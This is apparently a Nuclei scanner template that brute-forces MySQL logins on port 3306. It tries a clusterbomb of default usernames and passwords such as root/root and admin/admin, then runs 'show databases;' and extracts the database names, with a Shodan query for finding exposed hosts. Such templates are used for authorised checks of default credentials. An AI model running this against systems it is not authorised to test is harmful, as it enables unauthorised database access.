id: mysql-show-databases

info:
  name: MySQL - Show Databases
  author: DhiyaneshDk
  severity: high
  reference:
    - https://nmap.org/nsedoc/scripts/mysql-databases.html
  metadata:
    shodan-query: port:3306
    verified: true
  tags: js,mysql,network,enum

javascript:
  - code: |
      let m = require('nuclei/mysql');
      let c = m.MySQLClient();
      let response = c.ExecuteQuery(Host,Port,User,Pass,Query);
      Export(response);

    args:
      Host: "{{Host}}"
      Port: "3306"
      Query: "show databases;"
      User: "{{usernames}}"
      Pass: "{{passwords}}"

    payloads:
      usernames:
        - anonymous
        - root
        - admin
        - mysql
        - nagiosxi
      passwords:
        - SqlServer0
        - root
        - cloudera
        - admin
        - moves
    attack: clusterbomb

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "success == true"

    extractors:
      - type: json
        part: response
        json:
          - .Rows[] | .Database